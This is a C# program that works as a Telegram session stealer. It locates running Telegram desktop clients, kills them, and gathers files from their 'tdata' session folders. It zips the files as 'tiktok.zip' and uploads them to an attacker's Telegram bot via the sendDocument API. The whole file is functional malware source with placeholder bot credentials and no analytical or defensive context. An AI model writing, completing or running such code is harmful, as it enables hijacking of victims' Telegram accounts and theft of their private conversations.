using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    private static readonly string BotToken = "YOUR_BOT_TOKEN"; // Telegram Bot Token
    private static readonly string AdminId = "YOUR_ID"; // Telegram admin chat ID

    static async Task Main(string[] args)
    {
        await CheckAndGrab();
    }

    static string FindProcessPath(string processName)
    {
        var processes = Process.GetProcesses();
        foreach (var process in processes)
        {
            if (process.ProcessName.Equals(processName, StringComparison.OrdinalIgnoreCase))
            {
                return process.MainModule.FileName;
            }
        }
        return null;
    }

    static async Task Grb(string proc, string clientPath)
    {
        var processPath = FindProcessPath(proc);
        if (processPath != null)
        {
            var process = Process.GetProcessesByName(proc).FirstOrDefault();
            if (process != null)
            {
                process.Kill();
                process.WaitForExit();
            }
        }

        await Task.Delay(700); // Allow for the process to exit
        Directory.SetCurrentDirectory(Path.Combine(clientPath, "tdata"));

        var neededFiles = Directory.GetFiles(Directory.GetCurrentDirectory())
            .Where(f => f.Contains("s"))
            .ToList();

        var folderPath = FindFolderForFile(neededFiles.FirstOrDefault());
        if (folderPath != null)
        {
            neededFiles.AddRange(FastScandir(folderPath));
        }

        await CreateArchive(neededFiles, "tiktok.zip");

        using var httpClient = new HttpClient();
        var requestContent = new MultipartFormDataContent
        {
            { new StringContent(AdminId), "chat_id" },
            { new StringContent("HTML"), "parse_mode" },
            { new StringContent("new tdata file!!"), "caption" },
        };

        using (var fileStream = new FileStream("tiktok.zip", FileMode.Open, FileAccess.Read))
        {
            requestContent.Add(new StreamContent(fileStream), "document", "tiktok.zip");
            await httpClient.PostAsync($"https://api.telegram.org/bot{BotToken}/sendDocument", requestContent);
        }
    }

    static List<string> FastScandir(string dirname)
    {
        var files = new List<string>();
        try
        {
            foreach (var file in Directory.GetFiles(dirname))
            {
                files.Add(file);
            }
            foreach (var dir in Directory.GetDirectories(dirname))
            {
                if (ShouldExcludeDir(dir))
                {
                    continue; // Skip the directory if it is in the exclude list
                }

                files.Add(dir);  // Add the directory itself
                files.AddRange(FastScandir(dir)); // Recursively add directory contents
            }
        }
        catch (DirectoryNotFoundException) { }
        catch (Exception) { }

        return files;
    }

    static bool ShouldExcludeDir(string dirPath)
    {
        // Get the directory name
        var dirName = Path.GetFileName(dirPath);

        // List of directories to exclude
        var excludedDirs = new HashSet<string>
        {
            "dumps",
            "emoji",
            "tdummy",
            "temp"
        };

        // Check for presence in exclusions
        return excludedDirs.Contains(dirName) || dirName.StartsWith("user_data", StringComparison.OrdinalIgnoreCase);
    }

    static async Task CreateArchive(List<string> filePaths, string archiveName)
    {
        string archivePath = Path.Combine(Directory.GetCurrentDirectory(), archiveName);

        using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
        {
            foreach (var filePath in filePaths)
            {
                if (File.Exists(filePath))
                {
                    // Add file to the archive
                    archive.CreateEntryFromFile(filePath, Path.GetRelativePath(Directory.GetCurrentDirectory(), filePath));
                }
                else if (Directory.Exists(filePath))
                {
                    // Add directory (empty entry for the folder)
                    archive.CreateEntry(Path.GetRelativePath(Directory.GetCurrentDirectory(), filePath) + "/");
                }
            }
        }
    }

    static async Task CheckAndGrab()
    {
        var tasks = new List<Task>();
        var processes = new[] { "Unigram", "Telegram", "AyuGram", "Kotatogram", "iMe" };

        foreach (var process in processes)
        {
            var path = FindProcessPath(process);
            if (!string.IsNullOrEmpty(path))
            {
                tasks.Add(Grb(process, Path.GetDirectoryName(path)));
            }
        }

        await Task.WhenAll(tasks);
    }

    static string FindFolderForFile(string filePath)
    {
        // Implementation for finding the folder for a file (if needed)
        return Path.GetDirectoryName(filePath); // Example, can be replaced with your own logic
    }
}